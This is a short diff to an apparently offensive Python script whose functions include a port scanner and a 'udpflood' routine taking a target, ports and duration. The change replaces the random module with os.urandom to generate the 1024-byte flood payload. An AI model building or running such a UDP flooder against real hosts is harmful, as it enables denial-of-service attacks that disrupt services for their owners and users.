@@ -1,6 +1,6 @@
 import time
 import socket
-import random
+import os
 
 def scan_ports(ip):
     t_ip = socket.gethostbyname(ip)
@@ -22,7 +22,7 @@ def scan_ports(ip):
 
 def udpflood(target, target_ports, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    byts = bytes(random.randrange(0, 1024))
+    byts = os.urandom(1024)
     timeout = time.time() + duration
     sent = 0
     p = 0
